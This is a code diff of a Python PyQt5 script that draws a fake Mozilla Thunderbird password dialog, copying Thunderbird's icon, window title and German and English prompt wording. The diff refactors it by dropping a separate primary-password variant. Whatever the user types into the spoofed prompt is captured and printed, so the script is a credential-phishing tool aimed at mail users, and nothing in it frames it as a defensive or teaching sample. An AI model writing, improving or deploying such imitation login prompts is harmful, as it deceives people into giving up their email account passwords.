@@ -12,10 +12,9 @@ from PyQt5 import QtGui
 import filewriter
 
 
-installed_os: str = platform.system()
+INSTALLED_OS: str = platform.system()
 LINUX: str = "Linux"
 WINDOWS: str = "Windows"
-master_password = ""
 textfield: QLineEdit = None
 
 
@@ -23,10 +22,7 @@ class Lang(enum.Enum):
     DE = "DE"
     EN = "EN"
     OTHER = "OTHER"
-    
-class PasswordType(enum.Enum):
-    PASSWORD = "PASSWORD"
-    MASTERPASSWORD = "MASTERPASSWORD"
+
 
 def determine_system_lang() -> Lang:
     """
@@ -34,7 +30,7 @@ def determine_system_lang() -> Lang:
               `Lang.EN` if the detected system language is English,
               `Lang.OTHER` otherwise.
     """
-    if installed_os == LINUX:
+    if INSTALLED_OS == LINUX:
         if os.environ["LANG"].startswith("de_DE"):
             #print("German")
             return Lang.DE
@@ -44,7 +40,7 @@ def determine_system_lang() -> Lang:
         else:
             #print("other")
             return Lang.OTHER
-    elif installed_os == WINDOWS:
+    elif INSTALLED_OS == WINDOWS:
         # TODO: Add Windows-specific imports and language detection code
         pass
     
@@ -130,13 +126,6 @@ KEY_SCREENSHOT_BASE64: str = ""\
 "PYivDtybbdU2984W36xX942HP32bvu70dzrrOMT/7ruRF53GmDo2dxrLNPfOj3DN6db099Zmlzve"\
 "vI/Hejy9fh79QSv3E643X0RfREFsAAAAAElFTkSuQmCC"
 
-"""
-def copy_password(password_type: PasswordType) -> None:
-    if password_type == PasswordType.PASSWORD:
-        print(f"password = {textfield.text()}")
-    elif password_type == PasswordType.MASTERPASSWORD:
-        print(f"master password = {textfield.text()}")
-"""
         
 def copy_password() -> None:
     print(f"password = {textfield.text()}")
@@ -144,18 +133,14 @@ def copy_password() -> None:
 def copy_master_password() -> None:
     print(f"master password = {textfield.text()}")
 
-def password_window(password_type: PasswordType, account_name: str = "", host_name: str = "") -> None:
+def password_window(account_name: str = "", host_name: str = "") -> None:
     """
     Shows either a Thunderbird password input window or a Thunderbird
     master password input window, depending on the value of `password_type`.
     
-    :password_type: the type of the passwort to retrieve.
     :account_name:  default value ""; the part before the "@" of the standard 
-                    user email address; must only be specified 
-                    if `password_type` has value `PasswordType.PASSWORD`.
-    :host_name:     default value ""; the URL of the server to log in; 
-                    must/should only be specified if `password_type` has value
-                    `PasswordType.PASSWORD`.
+                    user email address.
+    :host_name:     default value ""; the URL of the server to log in.
     """
     global textfield
     #lang = Lang.EN # For easy testing of the English output
@@ -164,10 +149,8 @@ def password_window(password_type: PasswordType, account_name: str = "", host_na
     window = QWidget()
     #FONT_SIZE : int = 9
     
-    if password_type == PasswordType.PASSWORD:
-        window.setWindowTitle(f"Passwort eingeben für {account_name}" if lang == Lang.DE else f"Enter your password for {account_name}")
-    elif password_type == PasswordType.MASTERPASSWORD:
-        window.setWindowTitle("Passwort erforderlich - Mozilla Thunderbird" if lang == Lang.DE else "Password Required - Mozilla Thunderbird")
+    
+    window.setWindowTitle(f"Passwort eingeben für {account_name}" if lang == Lang.DE else f"Enter your password for {account_name}")
     #window.setFont(QtGui.QFont("Arial", FONT_SIZE))
     random.seed((datetime.now()).strftime("%H%M%S"))
     dir_name: str = rand_dir_name()
@@ -180,10 +163,7 @@ def password_window(password_type: PasswordType, account_name: str = "", host_na
     with open(encoded_tb_icon_path, "wb") as tb_icon:
         tb_icon.write(base64.b64decode(DEFAULT22_BASE64))
     window.setWindowIcon(QtGui.QIcon(encoded_tb_icon_path))
-    if password_type == PasswordType.PASSWORD:
-        window.setGeometry(100, 100, 545, 175) # TODO
-    elif password_type == PasswordType.MASTERPASSWORD:
-        window.setGeometry(100, 100, 400, 150)
+    window.setGeometry(100, 100, 545, 175)
 
     # Let the window sporn in the center of the screen:
     fg = window.frameGeometry()
@@ -200,46 +180,30 @@ def password_window(password_type: PasswordType, account_name: str = "", host_na
     key.move(15,15)
     shutil.rmtree(dir_name, ignore_errors=True)
     
-    if password_type == PasswordType.PASSWORD:
-        msg = QLabel(f"Geben Sie Ihr Passwort für \"{account_name}\" auf {host_name} ein:" if lang == Lang.DE else f"Enter your password for \"{account_name}\" on {host_name}:", parent=window)
-    elif password_type == PasswordType.MASTERPASSWORD:
-        msg = QLabel("Bitte geben Sie Ihr Hauptpasswort ein." if lang == Lang.DE else "Please enter your Primary Password.", parent=window)
+    msg = QLabel(f"Geben Sie Ihr Passwort für \"{account_name}\" auf {host_name} ein:" if lang == Lang.DE else f"Enter your password for \"{account_name}\" on {host_name}:", parent=window)
     msg.move(75, 30)
 
     textfield = QLineEdit(parent=window)
     textfield.move(70, 65)
-    textfield.setMinimumWidth(460 if password_type == PasswordType.PASSWORD else 305)
+    textfield.setMinimumWidth(460)
      # Show mask characters instead of the characters actually entered:
     textfield.setEchoMode(QLineEdit.Password)
-    if password_type == PasswordType.PASSWORD:
-        textfield.returnPressed.connect(copy_password)
-    elif password_type == PasswordType.MASTERPASSWORD:
-        textfield.returnPressed.connect(copy_master_password)
+    textfield.returnPressed.connect(copy_password)
         
-    if password_type == PasswordType.PASSWORD:
-        checkbox = QCheckBox("Die Passwortverwaltung benutzen, um dieses Passwort zu speichern." if lang == Lang.DE else "Use Password Manager to remember this password.", parent=window)
-        checkbox.move(75, 105)
-        checkbox.setFont(QtGui.QFont("Arial", 9))
+    checkbox = QCheckBox("Die Passwortverwaltung benutzen, um dieses Passwort zu speichern." if lang == Lang.DE else "Use Password Manager to remember this password.", parent=window)
+    checkbox.move(75, 105)
+    checkbox.setFont(QtGui.QFont("Arial", 9))
     
     cancel_button = QPushButton("Abbrechen" if lang == Lang.DE else "Cancel", parent=window)
     #cancel_button.setFont(QtGui.QFont("Arial", FONT_SIZE))
-    if password_type == PasswordType.PASSWORD:
-        cancel_button.setGeometry(350, 130, 85, 30)
-    elif password_type == PasswordType.MASTERPASSWORD:
-        cancel_button.setGeometry(200, 108, 85, 30)
+    cancel_button.setGeometry(350, 130, 85, 30)
 
     sign_in_button = QPushButton("Sign in", parent=window)
     #sign_in_button.setFont(QtGui.QFont("Arial", FONT_SIZE))
-    if password_type == PasswordType.PASSWORD:
-        sign_in_button.setGeometry(445, 130, 85, 30)
-    elif password_type == PasswordType.MASTERPASSWORD:
-        sign_in_button.setGeometry(290, 108, 85, 30)
+    sign_in_button.setGeometry(445, 130, 85, 30)
     sign_in_button.setFocus()
     # sign_in_button.setAutoDefault(True)
-    if password_type == PasswordType.PASSWORD:
-        sign_in_button.clicked.connect(copy_password)
-    elif password_type == PasswordType.MASTERPASSWORD:
-        sign_in_button.clicked.connect(copy_master_password)
+    sign_in_button.clicked.connect(copy_password)
 
     window.show()
     
@@ -250,5 +214,4 @@ def password_window(password_type: PasswordType, account_name: str = "", host_na
 
 
 if __name__ == "__main__":
-    password_window(PasswordType.PASSWORD, account_name="test", host_name="imap.example.com")
-    #password_window(PasswordType.MASTERPASSWORD)
+    password_window(account_name="test", host_name="imap.example.com")
